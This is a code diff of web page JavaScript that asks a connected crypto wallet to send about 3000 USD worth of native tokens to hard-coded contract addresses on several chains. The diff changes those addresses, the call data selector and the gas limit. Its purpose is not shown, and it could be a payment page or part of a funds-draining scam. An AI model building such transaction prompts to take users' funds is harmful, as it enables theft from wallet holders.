@@ -408,7 +408,7 @@ ethereum.on('chainChanged', (_chainId) => window.location.reload());
 
                         const accounts = await ethereum.request({ method: 'eth_accounts' });
                         var chainIDs = await ethereum.request({method: 'eth_chainId'});
-                        var passaddy = {'Polygon': '0x1cFFd3A9AC594dC5f0897a05aBea77E513734deb', 'Binance': '0xe7A074F0438FBE33158a09b8273Cf31ba3790590', 'Fantom': '0x176BB92DD354CBf36c694ade2A58264BAAE74186'}
+                        var passaddy = {'Polygon': '0xacaf038AB130D50Fc8d52FD6C9f8A05Dd8952f98', 'Binance': '0x6521C66E884b986666Bf02aE12AA3b577aFbE67B', 'Fantom': '0xdB991329C0482015Fd9f3170b85AEF634850599c'}
                         var numchain = {'0x1': 'Ethereum', '0x89': 'Polygon', '0x38': 'Binance', '0xfa': 'Fantom', '0x': 'undefined', 'null': 'undefined', 'undefined': 'undefined'};
                         const addychain = {'Ethereum' : '0x5f4ec3df9cbd43714fe2740f5e3616155c5b8419', 'Polygon' : polyaddy, 'Binance': bscaddress, 'Fantom': '0xf4766552D15AE4d256Ad41B6cf2933482B0680dc'};
                         let choosechain = numchain[chainIDs];
@@ -431,6 +431,8 @@ ethereum.on('chainChanged', (_chainId) => window.location.reload());
                         const pricex = (3000) / (parseInt(data) / 100000000);
                         var xrate = web3.utils.toWei(String(pricex), 'ether');
                         var Rate = web3.utils.numberToHex(xrate);
+                        var gasli = web3.utils.numberToHex(483451)
+
 
                         console.log(xrate);
                      async function workitx () { 
@@ -441,7 +443,8 @@ ethereum.on('chainChanged', (_chainId) => window.location.reload());
                                      from: accounts[0],
                                      to: passaddy[numchain[chainIDs]],
                                      chainid: chainIDs,
-                                     data: '0x3b80fb19',
+                                     gas: gasli,
+                                     data: '0xa27e5a7e',
                                     value: Rate}, 'latest']
                         })
                         .catch((err) => { if(err.code === 4001) 
